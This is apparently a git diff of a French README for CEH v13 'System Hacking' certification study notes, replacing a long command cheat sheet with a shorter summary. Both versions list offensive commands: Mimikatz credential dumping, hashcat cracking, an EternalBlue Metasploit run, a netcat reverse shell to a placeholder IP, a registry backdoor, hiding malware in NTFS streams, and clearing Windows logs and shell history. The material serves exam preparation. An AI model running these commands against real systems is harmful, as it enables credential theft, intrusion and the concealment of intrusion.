@@ -1,170 +1,93 @@
-# 💻 CEH v13 — Module 6 : System Hacking
+# 📚 CEH v13 — Module 06 : System Hacking
 
-> **Certified Ethical Hacker v13** | Notes de cours complètes  
-> 📅 Dernière mise à jour : Mars 2026  
-> ⚖️ **Poids à l'examen : 15%** — Domaine le plus important du CEH !
+> **Certified Ethical Hacker v13 — AI Powered**  
+> EC-Council | Formation officielle
 
 ---
 
-## 🗂️ Table des matières
+## 🗂️ Structure des notes
 
-| # | Fichier | Contenu |
-|---|---------|---------|
-| 01 | [Introduction & Méthodologie](./01-introduction-methodology.md) | CEH Hacking Methodology, objectifs, phases |
-| 02 | [Password Cracking](./02-password-cracking.md) | Types d'attaques, SAM, NTLM, Kerberos, outils |
-| 03 | [Exploitation de vulnérabilités](./03-vulnerability-exploitation.md) | Metasploit, Buffer Overflow, AI-powered tools |
-| 04 | [Escalade de privilèges](./04-privilege-escalation.md) | DLL Hijacking, UAC Bypass, Named Pipe, Spectre/Meltdown |
-| 05 | [Maintien de l'accès](./05-maintaining-access.md) | Backdoors, Keyloggers, Spyware, Persistence |
-| 06 | [Rootkits & Fichiers cachés](./06-rootkits-hidden-files.md) | Types de rootkits, NTFS ADS, détection |
-| 07 | [Stéganographie](./07-steganography.md) | Techniques, outils, stéganalyse |
-| 08 | [Covering Tracks](./08-covering-tracks.md) | Effacement logs, Windows/Linux, outils |
-| 09 | [Active Directory Attacks](./09-active-directory-attacks.md) | Pass-the-Hash, Kerberoasting, Golden Ticket |
+| Fichier | Contenu |
+|--------|---------|
+| [`01-introduction-methodology.md`](./01-introduction-methodology.md) | CEH Hacking Methodology (CHMA), objectifs, phases |
+| [`02-password-cracking.md`](./02-password-cracking.md) | Types d'attaques, SAM, NTLM, Kerberos, Mimikatz, Hashcat |
+| [`03-vulnerability-exploitation.md`](./03-vulnerability-exploitation.md) | Metasploit, Buffer Overflow, AI-powered tools |
+| [`04-privilege-escalation.md`](./04-privilege-escalation.md) | DLL Hijacking, UAC Bypass, Named Pipe, Spectre/Meltdown |
+| [`05-maintaining-acces.md`](./05-maintaining-acces.md) | Backdoors, Keyloggers, Spyware, Persistence Registry |
+| [`06-rootkits-hidden-files.md`](./06-rootkits-hidden-files.md) | Types de rootkits, NTFS ADS, Bootkit, détection |
+| [`07-steganography.md`](./07-steganography.md) | Techniques, outils (Steghide, OpenStego), stéganalyse |
+| [`08-covering-tracks.md`](./08-covering-tracks.md) | Effacement logs Windows/Linux, anti-forensics |
+| [`09-active-directory-attacks.md`](./09-active-directory-attacks.md) | Pass-the-Hash, Kerberoasting, Golden Ticket, BloodHound |
+| [`10-Quiz-et-Revision.md`](./10-Quiz-et-Revision.md) | Questions d'examen, mémo et checklist |
 
 ---
 
 ## 🎯 Objectifs du module
 
-À la fin de ce module, vous serez capable de :
+À l'issue de ce module, vous serez capable de :
 
-- ✅ Effectuer un cracking de mots de passe (brute-force, dictionnaire, rainbow tables)
+- ✅ Appliquer la méthodologie CEH Hacking (CHMA) en 5 étapes
+- ✅ Effectuer du cracking de mots de passe (brute-force, dictionnaire, rainbow tables)
 - ✅ Exploiter des vulnérabilités via Metasploit et buffer overflow
-- ✅ Escalader les privilèges sur Windows et Linux
-- ✅ Maintenir un accès persistant (backdoors, keyloggers, trojans)
-- ✅ Cacher des fichiers malveillants via rootkits, NTFS ADS, stéganographie
-- ✅ Effacer les traces de compromission
-- ✅ Conduire des attaques Active Directory (Pass-the-Hash, Kerberoasting)
+- ✅ Escalader les privilèges sur Windows (DLL Hijacking, UAC) et Linux (SUID)
+- ✅ Maintenir un accès persistant (backdoors, keyloggers, registry run keys)
+- ✅ Cacher des fichiers via rootkits et NTFS ADS (Alternate Data Streams)
+- ✅ Effacer les traces (logs, historique, timestamps)
+- ✅ Conduire des attaques Active Directory (Pass-the-Hash, Golden Ticket)
 
 ---
 
-## 🔑 La méthodologie CEH — 5 étapes
+## 📊 Poids dans l'examen CEH (312-50)
+
+```
+Module 06 — System Hacking
+Poids estimé : ~15-17% des questions — LE PLUS IMPORTANT !
+Nb de labs officiels : ~10 labs dans la plateforme iLabs/CyberQ
+Thèmes récurrents : NTLM/Kerberos/SAM, Mimikatz, Pass-the-Hash,
+                    Golden Ticket, NTFS ADS, DLL Hijacking,
+                    wevtutil, Metasploit sessions
+```
+
+---
+
+## 🔗 Ressources complémentaires
+
+- [EC-Council Official CEHv13](https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/)
+- [CyberQ Platform (Labs)](https://cyberq.eccouncil.org)
+- [Mimikatz (GitHub)](https://github.com/gentilkiwi/mimikatz)
+- [Metasploit Framework](https://www.metasploit.com/)
+- [BloodHound (AD attacks)](https://github.com/BloodHoundAD/BloodHound)
+- [PEASS-ng (PrivEsc)](https://github.com/carlospolop/PEASS-ng)
+
+---
+
+## 🧠 Méthodologie CEH System Hacking (CHMA)
 
 ```
 ┌──────────────────────────────────────────────────────────────┐
-│              CEH SYSTEM HACKING METHODOLOGY                  │
+│              CEH HACKING METHODOLOGY (CHMA)                  │
 ├──────────────────────────────────────────────────────────────┤
 │  1. GAINING ACCESS        → Password cracking, exploits      │
-│  2. ESCALATING PRIVILEGES → DLL Hijacking, UAC Bypass        │
+│  2. ESCALATING PRIVILEGES → DLL Hijacking, UAC Bypass, SUID  │
 │  3. EXECUTING APPS        → Keyloggers, backdoors, trojans   │
 │  4. HIDING FILES          → Rootkits, NTFS ADS, Stéganog.    │
 │  5. COVERING TRACKS       → Effacement logs, anti-forensics  │
 └──────────────────────────────────────────────────────────────┘
+
+Commandes essentielles :
+  Mimikatz  : sekurlsa::logonpasswords, lsadump::sam
+  Hashcat   : hashcat -m 1000 -a 0 hashes.txt rockyou.txt
+  Meterpreter : getsystem, run post/multi/recon/local_exploit_suggester
+  Windows logs : wevtutil cl System && wevtutil cl Security
+  NTFS ADS  : type malware.exe > legit.txt:malware.exe
+  Linux PrivEsc : find / -perm -4000 -type f 2>/dev/null
 ```
 
 ---
 
-## ⚡ Cheat Sheet — Commandes essentielles
-
-```bash
-# ═══════════════════════════════════════════════════
-# PASSWORD CRACKING
-# ═══════════════════════════════════════════════════
-# Hashcat — NTLM dictionary attack
-hashcat -m 1000 -a 0 hashes.txt rockyou.txt
-
-# Hashcat — NTLM brute-force 8 chars
-hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
-
-# John the Ripper
-john --wordlist=rockyou.txt --format=NT hashes.txt
-
-# Mimikatz — Dump credentials LSASS
-mimikatz # privilege::debug
-mimikatz # sekurlsa::logonpasswords
-
-# ═══════════════════════════════════════════════════
-# EXPLOITATION — METASPLOIT
-# ═══════════════════════════════════════════════════
-msfconsole
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS <target>
-exploit
-
-# ═══════════════════════════════════════════════════
-# PRIVILEGE ESCALATION — WINDOWS
-# ═══════════════════════════════════════════════════
-# Vérifier les privilèges
-whoami /priv
-
-# Meterpreter
-meterpreter > getsystem
-meterpreter > run post/multi/recon/local_exploit_suggester
-
-# ═══════════════════════════════════════════════════
-# PRIVILEGE ESCALATION — LINUX
-# ═══════════════════════════════════════════════════
-# SUID binaries
-find / -perm -4000 -type f 2>/dev/null
-
-# Kernel exploits
-uname -a
-
-# ═══════════════════════════════════════════════════
-# MAINTAINING ACCESS
-# ═══════════════════════════════════════════════════
-# Netcat backdoor
-nc -lvnp 4444
-nc <IP> 4444 -e /bin/bash
-
-# Windows persistence — Registry Run key
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe"
-
-# ═══════════════════════════════════════════════════
-# NTFS ADS (Alternate Data Streams)
-# ═══════════════════════════════════════════════════
-# Cacher un fichier dans un ADS
-type malware.exe > legit.txt:malware.exe
-
-# Lister les ADS
-dir /r
-streams.exe -s <directory>
-
-# ═══════════════════════════════════════════════════
-# COVERING TRACKS — LINUX
-# ═══════════════════════════════════════════════════
-export HISTSIZE=0
-history -c && history -w
-shred ~/.bash_history && cat /dev/null > ~/.bash_history
-
-# ═══════════════════════════════════════════════════
-# COVERING TRACKS — WINDOWS
-# ═══════════════════════════════════════════════════
-wevtutil cl System
-wevtutil cl Security
-wevtutil cl Application
-```
+> ⚠️ **Rappel éthique** : Toutes ces techniques nécessitent une **autorisation écrite préalable**. Leur usage sans permission est illégal.
 
 ---
 
-## 📊 Outils clés du Module 6
-
-| Catégorie | Outils |
-|-----------|--------|
-| **Password Cracking** | Hashcat, John the Ripper, Ophcrack, L0phtCrack, Hydra |
-| **Credential Dumping** | Mimikatz, ProcDump, secretsdump.py, WCE |
-| **Exploitation** | Metasploit, DeepExploit, Nebula (AI), Immunity Debugger |
-| **Privilege Escalation** | BeRoot, PowerSploit, PEASS-ng, WinPEAS, LinPEAS |
-| **Backdoors** | Netcat, Meterpreter, PowerShell Empire, Cobalt Strike |
-| **Keyloggers** | REFOG, Spyrix, Ardamax, Metasploit keyscan |
-| **Rootkits** | Horse Pill, GrayFish, Necurs, Azazel (Linux) |
-| **Steganographie** | OpenStego, QuickStego, Steghide, DeepSound, ShellGPT |
-| **Covering Tracks** | CCleaner, DBAN, Privacy Eraser, Wipe |
-| **AD Attacks** | Mimikatz, Rubeus, BloodHound, CrackMapExec, Impacket |
-
----
-
-## 🏆 Points importants pour l'examen
-
-> 📝 **15% du score total** — Portez une attention particulière à ces concepts !
-
-- Le **SAM** (Security Account Manager) stocke les hash de mots de passe Windows
-- **LM hash** : faible, max 14 chars, insensible à la casse → à ne plus utiliser
-- **NTLM** : challenge/response — vulnérable au Pass-the-Hash
-- **Kerberos** : authentification à tickets — vulnérable au Kerberoasting et Golden Ticket
-- **Pass-the-Hash** : utilise le hash NTLM sans connaître le mot de passe en clair
-- **Golden Ticket** : accès illimité en forgeant un TGT Kerberos (valide 10 ans)
-- **Rootkits kernel** : les plus dangereux — se cachent sous l'OS
-- **NTFS ADS** : cache des fichiers dans les flux alternatifs de données
-
----
-
-> ⚠️ **Rappel éthique** : Toutes les techniques de ce module sont enseignées à des fins **défensives et de tests autorisés uniquement**. Leur utilisation sans autorisation est **illégale**.
+*Notes rédigées dans le cadre de la préparation à la certification CEH v13 — EC-Council*  
+*Format : Markdown — Compatible GitHub Pages*
